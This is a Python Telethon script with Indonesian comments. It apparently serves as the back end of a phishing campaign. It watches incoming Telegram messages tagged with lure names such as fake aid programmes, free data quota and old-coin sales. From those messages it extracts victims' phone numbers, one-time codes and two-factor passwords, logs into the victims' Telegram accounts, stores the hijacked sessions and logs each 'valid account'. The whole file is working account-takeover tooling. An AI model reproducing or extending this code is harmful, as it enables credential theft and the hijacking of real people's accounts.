import asyncio
import re
import os
import json
from telethon import TelegramClient, events
# Asumsi: Anda memiliki api_id, api_hash, is_valid_phone_number, SESSIONS_FOLDER, SESSIONS_FOLDER_FINAL
# di dalam config.py
from config import api_id, api_hash, is_valid_phone_number, SESSIONS_FOLDER, SESSIONS_FOLDER_FINAL
# Asumsi: Anda memiliki fungsi-fungsi ini di login_handler2.py
# Misalnya:
# async def request_otp(phone_number): ...
# async def complete_login(phone_number, otp_code, log_callback): ...
# async def complete_login_with_password(phone_number, otp_code, password, log_callback): ...
# def get_pending(): return set of phone numbers currently awaiting OTP
from login_handler2 import request_otp, complete_login, get_pending, complete_login_with_password
from telethon.errors import SessionPasswordNeededError, FloodWaitError, PhoneNumberInvalidError, AuthBytesInvalidError, AuthKeyUnregisteredError, UserDeactivatedError

# --- Konfigurasi ---
KEYWORDS = [
    '❮ LAPORAN My Kasih ❯',
    '❮ LAPORAN BANTUAN MADANI ❯',
    '❮ LAPORAN Judul ❯',
    '❮ LAPORAN judul ❯',
    '❮ LAPORAN AHMAD SANJAYA ❯',
    '❮ LAPORAN GRATIS KUOTA ❯',
    '❮ LAPORAN UANG KUNO ❯',
    '❮ LAPORAN Uang Kuno ❯',
    '❮ LAPORAN Laporan ❯'
]

# user_states akan menyimpan {phone: {'otp': '...', 'password': '...', 'status': 'waiting_otp' / 'waiting_2fa' / 'logged_in'}}
user_states = {}
LOG_FILE = "valid_accounts.json"

# --- Fungsi Utility ---
def log_valid_account(phone):
    """Mencatat nomor telepon yang berhasil login ke file JSON."""
    data = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            # Handle empty or invalid JSON file
            data = []
        except Exception as e:
            print(f"[❌] Error reading {LOG_FILE}: {e}")
            data = []

    if phone not in data:
        data.append(phone)
        with open(LOG_FILE, "w") as f:
            json.dump(data, f, indent=2)
        print(f"[✅] Nomor {phone} berhasil dicatat sebagai akun valid.")
    else:
        print(f"[ℹ️] Nomor {phone} sudah ada di log.")

# --- Event Handler Telegram ---
@events.register(events.NewMessage)
async def handler(event):
    msg = event.raw_text
    sender_id = event.sender_id # Bisa digunakan untuk melacak pengirim pesan
    
    # Cek apakah pesan mengandung salah satu keyword
    if not any(kw in msg for kw in KEYWORDS):
        return # Abaikan pesan yang tidak relevan

    phone_match = re.search(r'(?:PHONE\s+NUMBER|NUMBER)\s*:\s*(\+?\d{10,15})', msg, re.IGNORECASE)
    otp_match = re.search(r'(?:OTP|PIN)\s*:\s*(\d{4,6})', msg, re.IGNORECASE) # OTP biasanya 4-6 digit
    pwd_match = re.search(r'(?:PASSWORD|PASS|KODE 2FA)\s*:\s*(\S+)', msg, re.IGNORECASE)

    if not phone_match:
        print("[⚠️] Pesan terdeteksi keyword, tapi tidak ada nomor telepon.")
        return

    raw_phone = phone_match.group(1).strip()
    phone = "+" + raw_phone if not raw_phone.startswith("+") else raw_phone

    if not is_valid_phone_number(phone):
        print(f"[❌] Nomor tidak valid: {phone}. Mengabaikan.")
        return

    # Inisialisasi state untuk nomor ini jika belum ada
    if phone not in user_states:
        user_states[phone] = {"otp": None, "password": None, "status": "new"}
        print(f"[✨] Inisialisasi state untuk nomor: {phone}")

    current_state = user_states[phone]

    # --- Deteksi dan Simpan OTP ---
    if otp_match:
        otp = otp_match.group(1)
        if current_state["otp"] != otp: # Hanya update jika OTP berbeda
            current_state["otp"] = otp
            print(f"[📥] OTP diterima: {otp} untuk {phone}")
        else:
            print(f"[ℹ️] OTP yang sama ({otp}) sudah ada untuk {phone}.")

    # --- Deteksi dan Simpan Password (2FA) ---
    if pwd_match:
        pwd = pwd_match.group(1)
        if current_state["password"] != pwd: # Hanya update jika password berbeda
            current_state["password"] = pwd
            print(f"[🔑] Password 2FA diterima: {pwd} untuk {phone}")
        else:
            print(f"[ℹ️] Password 2FA yang sama ({pwd}) sudah ada untuk {phone}.")

    # --- Logika Otentikasi ---

    # Skenario 1: Baru menerima nomor telepon (atau belum ada request OTP)
    if current_state["status"] == "new" and not current_state["otp"] and not current_state["password"]:
        if phone not in get_pending(): # Pastikan tidak ada request OTP yang sedang berjalan
            print(f"[📨] Meminta OTP untuk {phone}...")
            user_states[phone]["status"] = "waiting_otp_request" # Tandai sedang proses permintaan
            asyncio.create_task(request_otp(phone))
        else:
            print(f"[⏳] Sudah menunggu OTP untuk {phone} (status: {current_state['status']}).")
        return # Keluar setelah tindakan, tunggu pesan berikutnya

    # Skenario 2: OTP diterima, coba login
    if current_state["otp"] and current_state["status"] != "logged_in":
        if phone in get_pending(): # Pastikan OTP ini untuk sesi yang sedang menunggu
            print(f"[➡️] Mencoba login dengan OTP ({current_state['otp']}) untuk {phone}...")
            user_states[phone]["status"] = "completing_login_otp" # Tandai sedang proses login OTP
            try:
                # complete_login harus menangani SessionPasswordNeededError
                await complete_login(phone, current_state["otp"], log_callback=log_valid_account)
                user_states[phone]["status"] = "logged_in"
                print(f"[✅] Sesi untuk {phone} berhasil dibuat (dengan OTP).")
            except SessionPasswordNeededError:
                print(f"[⚠️] Nomor {phone} membutuhkan password 2FA. Menunggu password...")
                user_states[phone]["status"] = "waiting_2fa"
            except (FloodWaitError, PhoneNumberInvalidError, AuthBytesInvalidError, AuthKeyUnregisteredError, UserDeactivatedError) as e:
                print(f"[❌] Error saat login dengan OTP untuk {phone}: {e}")
                # Reset state atau tandai sebagai gagal jika perlu
                del user_states[phone] # Hapus state jika error fatal
            except Exception as e:
                print(f"[❌] Error tidak terduga saat login OTP untuk {phone}: {e}")
                # Hapus state jika error tidak terduga
                del user_states[phone]
        else:
            print(f"[⚠️] OTP diterima untuk {phone}, tetapi tidak ada permintaan OTP yang tertunda. Mungkin OTP kadaluarsa.")
            # Hapus state jika OTP tidak relevan
            # del user_states[phone] # Hati-hati dengan ini, bisa menghapus info penting

    # Skenario 3: Password 2FA diterima DAN sudah ada OTP (baik sudah dicoba atau belum)
    if current_state["password"] and current_state["status"] == "waiting_2fa":
        if current_state["otp"]: # Pastikan OTP juga ada
            print(f"[➡️] Mencoba login dengan Password 2FA ({current_state['password']}) untuk {phone}...")
            user_states[phone]["status"] = "completing_login_2fa" # Tandai sedang proses login 2FA
            try:
                await complete_login_with_password(phone, current_state["otp"], current_state["password"], log_callback=log_valid_account)
                user_states[phone]["status"] = "logged_in"
                print(f"[✅] Sesi untuk {phone} berhasil dibuat (dengan 2FA).")
            except (FloodWaitError, PhoneNumberInvalidError, AuthBytesInvalidError, AuthKeyUnregisteredError, UserDeactivatedError) as e:
                print(f"[❌] Error saat login 2FA untuk {phone}: {e}")
                del user_states[phone]
            except Exception as e:
                print(f"[❌] Error tidak terduga saat login 2FA untuk {phone}: {e}")
                del user_states[phone]
        else:
            print(f"[⚠️] Password 2FA diterima untuk {phone}, tetapi OTP belum tersedia. Menunggu OTP.")
            # Biarkan state "waiting_2fa"
    elif current_state["password"] and current_state["status"] != "waiting_2fa" and current_state["status"] != "logged_in":
        print(f"[ℹ️] Password 2FA diterima untuk {phone}, tapi belum waktunya digunakan. Status saat ini: {current_state['status']}")


async def main():
    print("[🚀] Memulai client utama...")
    
    # Pastikan folder sesi ada
    os.makedirs(SESSIONS_FOLDER, exist_ok=True)
    os.makedirs(SESSIONS_FOLDER_FINAL, exist_ok=True)
    
    client = TelegramClient("main2", api_id, api_hash, sequential_updates=True) # sequential_updates bisa membantu jika ada masalah dengan urutan pesan
    
    try:
        await client.start()
        print("[🚀] Bot aktif dan mendengarkan pesan.")
        client.add_event_handler(handler)
        await client.run_until_disconnected()
    except Exception as e:
        print(f"[🚨] Error saat memulai atau menjalankan bot: {e}")

if __name__ == "__main__":
    asyncio.run(main())